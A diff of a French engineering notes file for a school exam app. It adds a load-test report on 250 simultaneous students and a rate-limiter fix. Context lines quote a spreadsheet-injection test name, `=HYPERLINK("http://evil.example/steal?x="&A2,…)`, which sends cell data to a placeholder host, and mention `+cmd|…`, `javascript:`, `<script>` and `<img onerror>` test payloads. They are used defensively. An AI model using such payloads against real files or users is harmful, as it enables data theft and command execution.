@@ -160,6 +160,37 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 **Point de vigilance :** ces modèles « raisonnent » et les tokens de raisonnement consomment le budget de sortie ; la correction IA plafonne à `maxTokens: 500` — à surveiller sur des réponses longues (réponse vide possible).
 
+### Capacité : 250 élèves en simultané (2026-09-25)
+
+**Question :** l'app supporte-t-elle 250 élèves passant un examen en même temps ? **Réponse mesurée : pas en l'état.** Simulation locale du vrai code (vrai backend, base de test Postgres, stockage et emails simulés ; latence vers la base simulée en retardant chaque requête SQL — approximation, à confirmer en réel).
+
+| Scénario (250 élèves) | Résultat |
+|---|---|
+| Limiteurs d'origine, une seule IP | **15/250 entrent**, 0 soumission (le limiteur d'actions est saturé) |
+| Limiteurs coupés, base locale (0 ms) | OK, soumission simultanée ≈ 6 s |
+| Charge réaliste (1 réponse / 15 s), base à 20 ms | autosave 0,2 s, soumission 13 s, 0 échec |
+| Charge réaliste, base à 60 ms | 141/250 soumissions en erreur 500 |
+| Charge lourde (1 sauvegarde / 3 s), base à 20 ms | autosave 4,9 s, 83 soumissions en erreur |
+| Idem avec cache non vidé à chaque écriture (what-if) | autosave 65 ms, mais 124 soumissions encore en erreur |
+
+**Constats, par gravité :**
+1. **Limiteurs par IP inadaptés aux classes** (`joinLimiter` 15/15 min, `attemptActionLimiter` 120/5 min par IP) — **corrigé, voir ci-dessous**.
+2. **Soumission simultanée** : ≈ 16 requêtes SQL + une transaction par soumission ; le pool `pg` par défaut (10 connexions) est saturé → Prisma `P2028 Unable to start a transaction in the given time` → erreur 500. **Ouvert.**
+3. **9 à 16 requêtes SQL séquentielles par action** (une par relation chargée, cache invalidé à chaque écriture) → très sensible à la distance Render↔Neon. Pistes : mettre à jour le cache en place (mesuré : autosave ×75 plus rapide à 20 ms), `relationLoadStrategy: "join"` (nécessite `previewFeatures = ["relationJoins"]` + régénération du client, non testé), aligner les régions Render/Neon. **Ouvert.**
+4. **`trust proxy = 1` non vérifié sur Render** (derrière Cloudflare) : si `req.ip` est l'IP du proxy, tous les limiteurs par IP (login 10/15 min, inscription 5/h, IA, PDF, entrée) partagent un seul compteur pour tous les utilisateurs. À vérifier en loggant `req.ip` / `X-Forwarded-For` sur un vrai appel. **Ouvert.**
+5. **Non mesuré, lu dans le code :** dépôts de fichiers lus en entier en mémoire (OOM possible sur 512 Mo avec beaucoup de dépôts simultanés) ; emails de résultats envoyés pendant la soumission (quota Resend gratuit, expéditeur `onboarding@resend.dev` limité à l'adresse du compte tant qu'aucun domaine n'est vérifié) ; `GET /api/evaluations` renvoie toutes les tentatives de toutes les évaluations (149 Ko pour 250 tentatives d'une seule évaluation) ; CPU ≈ 6–18 ms/requête, donc plafond bas sur une petite instance Render.
+
+**Correctif appliqué — limiteurs (n°1) :** [attempt.routes.js](backend/src/routes/attempt.routes.js)
+- entrée (`/join`) : plafond par IP relevé à **1000 / 15 min** (configurable via `JOIN_RATE_LIMIT_PER_IP`) — le code d'accès a 32⁶ ≈ 1,07 milliard de combinaisons, l'effet sur la devinette est négligeable ;
+- actions (lecture, sauvegarde, sortie, soumission) : limite **par tentative** (120 / min, l'identifiant cuid sert déjà de jeton d'accès) au lieu de par IP ;
+- dépôts de fichiers : **10 / 5 min par tentative** ;
+- sondage d'identifiants : plafond par IP de **600 réponses 404 / 5 min** (les requêtes réussies ne comptent pas), pour ne pas perdre toute protection contre l'énumération.
+- Compromis assumé : un élève malveillant derrière la même IP peut bloquer ses camarades 5 min en provoquant 600 erreurs 404 ; borner cela exigerait des comptes élèves.
+
+**Vérification :** 5 nouveaux tests ([attempt.routes.test.js](backend/src/routes/__tests__/attempt.routes.test.js)) : 250 élèves derrière une même IP passent sans 429 (entrée + lecture + sauvegarde), limite par tentative sans effet sur les autres, plafond d'entrée configurable, blocage du sondage 404, limite de dépôts. Suite unitaire `139 passed`, intégration `16 passed`. Simulation A rejouée avec les limiteurs actifs : **250/250 entrent, 250/250 soumettent, 0 refus 429** (avant : 15/250 et 0).
+
+---
+
 ### Test bout en bout des correctifs 1 et 2 (2026-09-25)
 
 **Méthode :** environnement local complet (vrai backend + vrai frontend Vite + base Postgres de **test** `edueval_test`, jamais la prod), avec un stockage objet en mémoire à la place du bucket S3 réel. Données de test : 4 étudiants dont 2 aux noms piégés (`=HYPERLINK(…)`, `+cmd|…`), un `.xlsx` et un `.docx` piégés (liens `javascript:`, cellules/paragraphes contenant `<script>` et `<img onerror>`). Tout a été fait depuis l'UI enseignant réelle ; environnement démonté et base de test vidée ensuite.
